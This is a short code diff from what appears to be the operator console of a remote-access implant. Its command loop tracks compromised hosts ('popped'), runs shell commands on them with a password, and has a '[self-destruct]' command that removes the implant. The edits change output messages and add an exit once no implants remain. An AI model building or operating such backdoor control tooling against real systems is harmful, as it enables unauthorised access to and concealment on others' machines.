@@ -288,15 +288,21 @@ def main(argv):
                     continue
 
                 host_list.pop(-1)
-                print(f"[+] successfully popped host {ip}:{port}\n")
+                print(f"[+] successfully popped server '{ip}:{port}'\n")
         elif cmd_bin == "[self-destruct]":
-            confirm = input("[?] are you sure you want to permantently remove the implant from the system? (y/N): \n")
+            confirm = input("[?] are you sure you want to permantently remove the implant from the system? (y/N): ")
             if confirm.lower() != "y":
                 continue
 
             server_exit(host_list, password)
-            print(f"[+] successfully self destructed server {host_list[-1]}\n")
+
+            addr = host_list[-1]
+            print(f"[+] successfully self destructed server '{addr[0]}:{addr[1]}'\n")
             host_list.pop(-1)
+
+            # if last module self-destructed
+            if host_list == []:
+                return
         elif cmd_bin == "cd":
             pwd_new = os.path.normpath(os.path.join(pwd, cmd_argv[1]))
             rsp = exec(host_list, password, "", f"test -d {pwd_new}")
